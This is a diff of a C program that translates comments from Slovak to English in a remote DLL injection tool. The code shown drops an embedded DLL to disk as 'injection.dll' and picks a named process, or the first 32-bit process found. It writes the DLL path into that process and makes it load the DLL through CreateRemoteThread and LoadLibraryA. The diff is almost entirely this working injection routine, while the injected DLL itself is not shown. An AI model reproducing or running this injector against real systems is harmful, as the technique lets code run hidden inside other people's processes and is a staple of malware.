@@ -56,7 +56,7 @@ int findPidOf32BitProcess(){
     return 0;
 }
 
-//najde PID specifikovaneho procesu 
+//find PID of prcoess
 int findPidOfProcess(char process[25]){
     PROCESSENTRY32 pe32;
     HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
@@ -64,31 +64,30 @@ int findPidOfProcess(char process[25]){
         //vrati 0; pokial sa nevytvoril snapshot
         return 0;
     }
-    pe32.dwSize = sizeof(PROCESSENTRY32); //musi sa najprv nastavit velkost podla dokumentacie
-    if (Process32First(hProcessSnap, &pe32)){   //ziska prvy process
-        if (strcmp(pe32.szExeFile, process) == 0){ //porovna nazvy
+    pe32.dwSize = sizeof(PROCESSENTRY32); //according the documentation, size must be set first
+    if (Process32First(hProcessSnap, &pe32)){   //get first process
+        if (strcmp(pe32.szExeFile, process) == 0){ //compare process names
             return pe32.th32ProcessID;
         }
     }
     while(Process32Next(hProcessSnap, &pe32)){
-        if (strcmp(pe32.szExeFile, process) == 0){ //porovna nazvy
+        if (strcmp(pe32.szExeFile, process) == 0){ //compare process names
             return pe32.th32ProcessID;
         }
     }
     return 0;
 }
 
-//vytvori DLL na disku
+//create DLL on disk
 char* dropDll(){
     HANDLE hFile;
-    char *fileName = "dll.dll";
+    char *fileName = "injection.dll";
     hFile = CreateFileA(fileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //create file
     if (hFile == INVALID_HANDLE_VALUE){
         return 0;
     }
     if(WriteFile(hFile, dll, dllSize, NULL, NULL)){
-        //pokial sa uspesne zapisalo dll
-        //musi sa ziskat working direcotry
+        //getting absoluthe path to created DLL
         TCHAR wd[MAX_PATH] = { 0 };
         GetCurrentDirectory(MAX_PATH, wd);
         char *filePath = (char *)malloc(MAX_PATH);
@@ -110,29 +109,30 @@ int remoteDllInjection(char process[25]){
     }else{
         pid = findPidOfProcess(process);
     }
-
+    
     if (pid == 0){
         return 1; //Process does not exist.
     }
+
     char *dllPath = (char *)dropDll();
     if (dllPath == 0){
-        return 2; //nevytvorilo sa DLL
+        return 2; //DLL could not be created
     }
 
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,0,pid);
     if (hProcess == INVALID_HANDLE_VALUE) {
-        return 3; //neotvoril sa porcess
+        return 3; //Process could not be opened
     }
     
     int dllPathSize = strlen(dllPath);
     int *allocAddress;
     allocAddress = VirtualAllocEx(hProcess, NULL, dllPathSize + 1, MEM_COMMIT, PAGE_READWRITE);
     if(allocAddress == NULL){
-        return 4; //nealokovalo sa miesto v procese
+        return 4; //Could not allocate memory in remote processse
     }
 
     if (WriteProcessMemory(hProcess, allocAddress, dllPath, dllPathSize, NULL) == 0){
-        return 5; //nezapisala sa cesta do vzdialeneho procesu
+        return 5; //Could not write to remote process
     }
 
     FARPROC loadLibraryAddress = NULL;
@@ -141,18 +141,18 @@ int remoteDllInjection(char process[25]){
         loadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryA");
     }
     if (loadLibraryAddress == NULL){
-        return 6; //nanasla sa LoadLibrary v vzdialenom procese
+        return 6; //Could not found LoadLibrary function
     }
     
     HANDLE hNewThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, allocAddress, 0, NULL);
     if(hNewThread == NULL){
-        return 7; //vzdialene vlakno sa nevytvorilo
+        return 7; //Could not create remote thread
     }
     
     WaitForSingleObject(hNewThread, 200);
 
     if(VirtualFreeEx(hProcess, allocAddress, 0, MEM_RELEASE) == 0){
-        return 8; // nepodarilo sa uvolnit miesto v vzdialenom procese
+        return 8; // Could not free address in remote process
     }
     CloseHandle(hProcess);
     return 0;
@@ -163,17 +163,16 @@ int remoteDllInjection(char process[25]){
 int main(int argc, char *argv[]){
     char process[25];
     if (argc > 1){ 
-        //pokial sme zadali process, do  ktoreho ma vlozit DLL
+        //first argument shoudl be taret process name
         if(strlen(argv[1]) < 25){
             strcpy(process, argv[1]);
         }else{
             //pokial sa argument nezmensti do pola, tak sa vlozi defualtny process
             goto Default;
-        }    
+        }   
     }else{
-        //pokial sme nezadali process, do  ktoreho ma vlozit DLL, tak sa nastavi defualtny process
+        //default process name
         Default:process[0] = 0x00; // if no process name is provided, program injects dll to the fisrt 32 bit porcess found
-
     }
 
     switch (remoteDllInjection(process))
